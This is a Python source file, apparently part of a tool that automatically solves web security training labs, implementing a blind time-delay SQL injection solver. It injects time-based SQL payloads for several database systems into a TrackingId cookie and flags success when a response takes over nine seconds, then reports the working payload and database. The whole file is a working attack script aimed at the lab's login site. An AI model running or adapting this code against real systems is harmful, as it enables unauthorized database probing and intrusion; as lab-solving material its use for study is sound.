from rich import print
import time

from services.sql_injection.base_sql_injection import SQLInjectionBaseSolver

class BlindTimeDelaysSolver(SQLInjectionBaseSolver):
    def __init__(self, URL):
        super().__init__(URL)
        url = f"{self.url}/login"
        self._request_lab('GET', url)
        self.session = self.html_content.cookies.get('session')
        self.trackingId = self.html_content.cookies.get('TrackingId')

    def solve(self):
        """Solve the lab."""
        self.custom_payload()
        self._print_solved()

    def custom_payload(self):
        """Build the payload."""
        found = False
        self.spinner.start()
        self.spinner.text = "Finding Payload for Time Based"
        for dbms in self.json_payload:
            self.spinner.text = f"Trying {dbms['name']} Payload"
            for query in dbms['time_based_command']:
                cookies = {
                    'session': self.session,
                    'TrackingId': f"{self.trackingId}{query}-- -"
                }
                start = time.time()
                self._request_lab('GET', self.url, cookies=cookies)
                end = time.time()
                if end - start > 9:
                    found = True
                    self.spinner.stop()
                    self.spinner.clear()
                    print(f"\n[green]Payload Found:[/green] {query}")
                    print(f"[green]DBMS Found:[/green] {dbms['name']}") 
                    break
            if found:
                break